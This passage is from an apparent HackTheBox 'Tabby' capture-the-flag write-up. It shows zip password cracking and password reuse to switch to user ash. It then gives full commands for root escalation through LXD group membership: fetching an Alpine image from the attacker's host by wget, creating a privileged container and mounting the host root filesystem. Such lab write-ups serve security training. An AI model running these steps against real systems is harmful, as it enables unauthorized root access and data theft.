<p>We can also use <a href="https://github.com/ColdFusionX/ZipBreaker"><strong>ZipBreaker</strong></a> a small tool I wrote in python to crack zip files password.</p>

<p>This tool not only cracks the password but also extracts itâ€™s content inside the user specified directory.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby<span class="nv">$ </span>./zipBreaker.py <span class="nt">-z</span> backup.zip <span class="nt">-w</span> key.txt <span class="nt">-d</span> backup
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Zip file Password Cracking Script by ColdFusionX

<span class="o">[</span>/] Hunting: Trying with Password admin@it

<span class="o">[</span>+] SUCCESS <span class="o">!!</span>
<span class="o">[</span>+] Password found: admin@it
<span class="o">[</span>+] Files Extracted inside -&gt; backup directory!
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Going through the Zip file contents, We donâ€™t see anything useful:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:~/htb/tabby/backup<span class="nv">$ </span>tree
<span class="nb">.</span>
â””â”€â”€ var
    â””â”€â”€ www
        â””â”€â”€ html
            â”œâ”€â”€ assets
            â”œâ”€â”€ favicon.ico
            â”œâ”€â”€ files
            â”œâ”€â”€ index.php
            â”œâ”€â”€ logo.png
            â”œâ”€â”€ news.php
            â””â”€â”€ Readme.txt

5 directories, 5 files
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="su---ash">SU - ash</h3>

<p>Since the file was actually owned by Ash, there might be a possibility that <code class="language-plaintext highlighter-rouge">ash</code> might have reused this password elsewhere, on trying <code class="language-plaintext highlighter-rouge">SU</code> as ash with this password, we get switched to user <code class="language-plaintext highlighter-rouge">ash</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre>tomcat@tabby:~<span class="nv">$ </span>su ash -
Password:
ash@tabby:/opt/tomcat<span class="nv">$ </span><span class="nb">whoami
</span>ash

</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="usertxt">user.txt</h4>

<p>Grabbing <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
84f94163521c3937<span class="k">****************</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="elevating-priv-ash---root">Elevating Priv: ash -&gt; root</h2>

<h3 id="enumeration-1">Enumeration</h3>

<p>User ash is a member of <code class="language-plaintext highlighter-rouge">lxd</code> group, which is an awesome privilege escalation vector.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="lxd-priv-esc">LXD Priv Esc</h3>

<p>Basic scenario behind this attack is that the members of lxd group can create containers with elevated privileges and mount the root file system to it and later access it.</p>

<h4 id="image-creation">Image Creation</h4>

<p>First we will create a small alpine image using <a href="https://github.com/saghul/lxd-alpine-builder"><em>LXD Alpine builder</em></a>, clone the repo to our machine and run the build script:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre></td> --><td class="rouge-code"><pre>coldfx@Shockwave:/opt<span class="nv">$ </span><span class="nb">sudo </span>git clone https://github.com/saghul/lxd-alpine-builder                                                                                                             
Cloning into <span class="s1">'lxd-alpine-builder'</span>...                                                                                                                                                           
remote: Enumerating objects: 27, <span class="k">done</span><span class="nb">.</span>                                                                                                                                                         
remote: Total 27 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 27                                                                                                                                 
Unpacking objects: 100% <span class="o">(</span>27/27<span class="o">)</span>, 15.98 KiB | 380.00 KiB/s, <span class="k">done</span><span class="nb">.</span>                                                                                                                               
coldfx@Shockwave:/opt<span class="nv">$ </span><span class="nb">cd </span>lxd-alpine-builder/                                                                                                                                                  
coldfx@Shockwave:/opt/lxd-alpine-builder<span class="nv">$ </span><span class="nb">sudo</span> ./build-alpine                                                                                                                                  
Determining the latest release... v3.12                                                                                                                                                        
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64                                                                                                                  
Downloading alpine-mirrors-3.5.10-r0.apk                                                                                                                                                       
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>                                                                                                                        
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>                                                                                                                        
Downloading alpine-keys-2.2-r0.apk                                                                                                                                                             
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>                                                                                                                        
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>                                                                                                                        
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>                                                                                                                        
<span class="o">[</span>..SNIP..]
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1'</span>
<span class="nb">tar</span>: Ignoring unknown extended header keyword <span class="s1">'APK-TOOLS.checksum.SHA1
Downloading apk-tools-static-2.10.5-r1.apk
tar: Ignoring unknown extended header keyword '</span>APK-TOOLS.checksum.SHA1<span class="s1">'
tar: Ignoring unknown extended header keyword '</span>APK-TOOLS.checksum.SHA1<span class="s1">'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
Verified OK
Selecting mirror http://dl-2.alpinelinux.org/alpine/v3.12/main
fetch http://dl-2.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r9)
(2/19) Installing busybox (1.31.1-r19)
Executing busybox-1.31.1-r19.post-install
(3/19) Installing alpine-baselayout (3.2.0-r7)
Executing alpine-baselayout-3.2.0-r7.pre-install
Executing alpine-baselayout-3.2.0-r7.post-install
(4/19) Installing openrc (0.42.1-r11)
Executing openrc-0.42.1-r11.post-install
(5/19) Installing alpine-conf (3.9.0-r1)
(6/19) Installing libcrypto1.1 (1.1.1g-r0)
(7/19) Installing libssl1.1 (1.1.1g-r0)
(8/19) Installing ca-certificates-bundle (20191127-r4)
(9/19) Installing libtls-standalone (2.9.1-r1)
(10/19) Installing ssl_client (1.31.1-r19)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.5-r1)
(13/19) Installing busybox-suid (1.31.1-r19)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.6-r0)
(16/19) Installing musl-utils (1.1.24-r9)
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.1-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages

coldfx@Shockwave:/opt/lxd-alpine-builder$ ls
alpine-v3.12-x86_64-20201111_2341.tar.gz  build-alpine  LICENSE  README.md
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>Next weâ€™ll transfer it to Tabby by hosting a python3 server on our machine using <code class="language-plaintext highlighter-rouge">python3 -m http.server 1337</code> and download it on tabby using <code class="language-plaintext highlighter-rouge">wget</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>wget http://10.10.14.9:1337/alpine-v3.12-x86_64-20201111_2341.tar.gz
<span class="nt">--2020-11-11</span> 18:30:47--  http://10.10.14.9:1337/alpine-v3.12-x86_64-20201111_2341.tar.gz
Connecting to 10.10.14.9:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3213612 <span class="o">(</span>3.1M<span class="o">)</span> <span class="o">[</span>application/gzip]
Saving to: â€˜alpine-v3.12-x86_64-20201111_2341.tar.gzâ€™

alpine-v3.12-x86_64-20201111_2341.tar.gz        100%[<span class="o">======================================================================================================&gt;]</span>   3.06M  2.41MB/s    <span class="k">in </span>1.3s    

2020-11-11 18:30:49 <span class="o">(</span>2.41 MB/s<span class="o">)</span> - â€˜alpine-v3.12-x86_64-20201111_2341.tar.gzâ€™ saved <span class="o">[</span>3213612/3213612]
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="image-import">Image import</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc image import alpine-v3.12-x86_64-20201111_2341.tar.gz <span class="nt">--alias</span> cfximage
If this is your first <span class="nb">time </span>running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

Image imported with fingerprint: 3747acf3e102c42530f8f0dd342bd566458266581bc15e345c92c2ade6b7ffb4
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It appears lxd is not running on the machine by default as a result we are a getting a suggestion to run <code class="language-plaintext highlighter-rouge">lxd init</code> first, so weâ€™ll run it by accepting all default options:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxd init
Would you like to use LXD clustering? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]:
Do you want to configure a new storage pool? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>:
Name of the new storage pool <span class="o">[</span><span class="nv">default</span><span class="o">=</span>default]: Name of the storage backend to use <span class="o">(</span>lvm, ceph, btrfs, <span class="nb">dir</span><span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>btrfs]:
Create a new BTRFS pool? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>:
Would you like to use an existing block device? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]:
Size <span class="k">in </span>GB of the new loop device <span class="o">(</span>1GB minimum<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>15GB]:
Would you like to connect to a MAAS server? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]:
Would you like to create a new <span class="nb">local </span>network bridge? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>:
What should the new bridge be called? <span class="o">[</span><span class="nv">default</span><span class="o">=</span>lxdbr0]:
What IPv4 address should be used? <span class="o">(</span>CIDR subnet notation, â€œautoâ€ or â€œnoneâ€<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto]:
What IPv6 address should be used? <span class="o">(</span>CIDR subnet notation, â€œautoâ€ or â€œnoneâ€<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto]:
Would you like LXD to be available over the network? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]:
Would you like stale cached images to be updated automatically? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>
Would you like a YAML <span class="s2">"lxd init"</span> preseed to be printed? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]:
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We can check our image:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc image list
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| cfximage | 3747acf3e102 | no     | alpine v3.12 <span class="o">(</span>20201111_23:41<span class="o">)</span> | x86_64       | CONTAINER | 3.06MB | Nov 11, 2020 at 6:31pm <span class="o">(</span>UTC<span class="o">)</span> |
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="creating-container">Creating Container</h4>

<p>Now that our image has been successfully imported, weâ€™ll create a container <code class="language-plaintext highlighter-rouge">fusion-root</code> with security privileges which allows it to run as root:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc init cfximage fusion-root <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>Creating fusion-root
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="mounting-root-filesystem">Mounting root filesystem</h4>

<p>Next, weâ€™ll mount the root file system to our container:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc config device add fusion-root cold-device disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>Device cold-device added to fusion-root
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="starting-the-container">Starting the container</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc start fusion-root
ash@tabby:~<span class="nv">$ </span>lxc list
+-------------+---------+---------------------+-----------------------------------------------+-----------+-----------+
|    NAME     |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+-------------+---------+---------------------+-----------------------------------------------+-----------+-----------+
| fusion-root | RUNNING | 10.246.48.11 <span class="o">(</span>eth0<span class="o">)</span> | fd42:e693:434f:7134:216:3eff:fef3:f762 <span class="o">(</span>eth0<span class="o">)</span> | CONTAINER | 0         |
+-------------+---------+---------------------+-----------------------------------------------+-----------+-----------+
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="root-shell">Root Shell</h3>

<p>Using <code class="language-plaintext highlighter-rouge">lxc exec</code> we can access root file system inside the container</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc <span class="nb">exec </span>fusion-root /bin/sh
~ <span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
~ <span class="c"># whoami</span>
root
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="accessing-mounted-root">Accessing mounted root</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>~ <span class="c"># cd /mnt/root/</span>
/mnt/root <span class="c"># ls</span>
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="grabbing-roottxt">Grabbing root.txt</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>/mnt/root <span class="c"># cat root/root.txt</span>
515f9b6d82c645f<span class="k">*****************</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>And we pwned the Box !</p>

<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
:ET